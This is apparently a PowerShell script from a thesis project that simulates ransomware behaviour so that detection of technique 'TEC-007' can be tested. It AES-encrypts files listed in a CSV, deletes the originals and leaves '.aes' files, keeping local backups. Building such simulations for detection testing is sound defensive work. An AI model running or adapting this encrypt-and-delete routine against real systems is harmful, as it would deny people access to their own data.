# TFM candidate v2 - Controlled AES encryption simulator for TEC-007 validation.
# Uses parameters and $PSScriptRoot to avoid hard-coded mismatch between
# Ransomware and TEC-007_Ransomware folders.
# Detection must be based on behavior: AES/CryptoStream/CreateEncryptor/.aes.

param(
    [string]$WorkDir = $PSScriptRoot,
    [string]$ListFile = (Join-Path $PSScriptRoot "lista_archivos.csv"),
    [string]$PasswordFile = (Join-Path $PSScriptRoot "password.txt"),
    [int]$MaxFiles = 25
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

function Encrypt-File-AES {
    param(
        [Parameter(Mandatory=$true)][string]$InputFile,
        [Parameter(Mandatory=$true)][string]$OutputFile,
        [Parameter(Mandatory=$true)][string]$Password
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($Password))
    $aes.GenerateIV()

    $inStream = [IO.File]::OpenRead($InputFile)
    $outStream = [IO.File]::Create($OutputFile)
    $crypto = $null

    try {
        $outStream.Write($aes.IV, 0, $aes.IV.Length)
        $crypto = New-Object System.Security.Cryptography.CryptoStream($outStream, $aes.CreateEncryptor(), 'Write')
        $inStream.CopyTo($crypto)
        $crypto.FlushFinalBlock()
    }
    finally {
        if ($null -ne $crypto) { $crypto.Dispose() }
        $inStream.Dispose()
        $outStream.Dispose()
        $aes.Dispose()
    }
}

if (-not (Test-Path -LiteralPath $WorkDir)) {
    throw "WorkDir does not exist: $WorkDir"
}

if (-not (Test-Path -LiteralPath $ListFile)) {
    throw "ListFile does not exist: $ListFile"
}

if (-not (Test-Path -LiteralPath $PasswordFile)) {
    throw "PasswordFile does not exist: $PasswordFile"
}

$password = (Get-Content -LiteralPath $PasswordFile -Raw).Trim()
if ([string]::IsNullOrWhiteSpace($password)) {
    throw "PasswordFile is empty."
}

$backupFolder = Join-Path $WorkDir "backups"
if (-not (Test-Path -LiteralPath $backupFolder)) {
    New-Item -Path $backupFolder -ItemType Directory -Force | Out-Null
}

$testFiles = Import-Csv -LiteralPath $ListFile | Where-Object {
    $_.FullName -and (Test-Path -LiteralPath $_.FullName)
} | Select-Object -First $MaxFiles

if (-not $testFiles -or $testFiles.Count -lt 1) {
    throw "No valid files found in CSV for controlled encryption."
}

$encryptedCount = 0

foreach ($file in $testFiles) {
    $inputPath = $file.FullName
    $safeName = [IO.Path]::GetFileName($inputPath)
    $backupPath = Join-Path $backupFolder ($safeName + ".original")
    $tempEncrypted = Join-Path $WorkDir ("temp_" + [IO.Path]::GetFileNameWithoutExtension($safeName) + ".aes")
    $finalEncrypted = [IO.Path]::ChangeExtension($inputPath, ".aes")

    Copy-Item -LiteralPath $inputPath -Destination $backupPath -Force
    Encrypt-File-AES -InputFile $backupPath -OutputFile $tempEncrypted -Password $password

    if (-not (Test-Path -LiteralPath $tempEncrypted)) {
        throw "Encrypted temp file was not created: $tempEncrypted"
    }

    Remove-Item -LiteralPath $inputPath -Force
    Move-Item -LiteralPath $tempEncrypted -Destination $finalEncrypted -Force

    if (Test-Path -LiteralPath $finalEncrypted) {
        $encryptedCount++
    }
}

if ($encryptedCount -lt 1) {
    throw "No .aes files were generated."
}

Write-Host "Controlled encryption completed."
Write-Host "Encrypted files: $encryptedCount"
Write-Host "Validation: .aes files generated before restore."
